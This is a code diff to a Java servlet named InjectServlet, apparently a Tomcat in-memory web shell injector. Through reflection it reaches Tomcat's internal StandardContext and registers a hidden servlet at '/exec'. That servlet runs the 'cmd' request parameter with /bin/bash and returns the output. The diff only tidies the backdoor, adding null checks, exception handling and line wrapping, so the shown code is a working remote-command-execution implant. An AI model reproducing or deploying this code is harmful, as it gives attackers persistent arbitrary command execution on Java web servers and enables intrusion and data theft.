@@ -21,11 +21,13 @@ public class InjectServlet extends HttpServlet {
 
             java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
             contextField.setAccessible(true);
-            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
+            org.apache.catalina.core.ApplicationContext applicationContext =
+                    (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
             //获取ApplicationContext中的StandardContext
             contextField = applicationContext.getClass().getDeclaredField("context");
             contextField.setAccessible(true);
-            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
+            org.apache.catalina.core.StandardContext standardContext =
+                    (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
 
             String servletPath = "/exec";
             String servletName = "execServlet";
@@ -39,17 +41,24 @@ public class InjectServlet extends HttpServlet {
                 }
                 @Override
                 public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
-                    String cmd = servletRequest.getParameter("cmd");
-                    {
-                        InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
-                        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-                        String output = s.hasNext() ? s.next() : "";
-                        servletResponse.setCharacterEncoding("GBK");
-                        PrintWriter out = servletResponse.getWriter();
-                        out.println(output);
-                        out.flush();
-                        out.close();
+                    try {
+                        String cmd = servletRequest.getParameter("cmd");
+                        if (cmd != null)
+                        {
+                            InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd})
+                                    .getInputStream();
+                            Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+                            String output = s.hasNext() ? s.next() : "";
+                            servletResponse.setCharacterEncoding("GBK");
+                            PrintWriter out = servletResponse.getWriter();
+                            out.println(output);
+                            out.flush();
+                            out.close();
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     }
+
                 }
                 @Override
                 public String getServletInfo() {
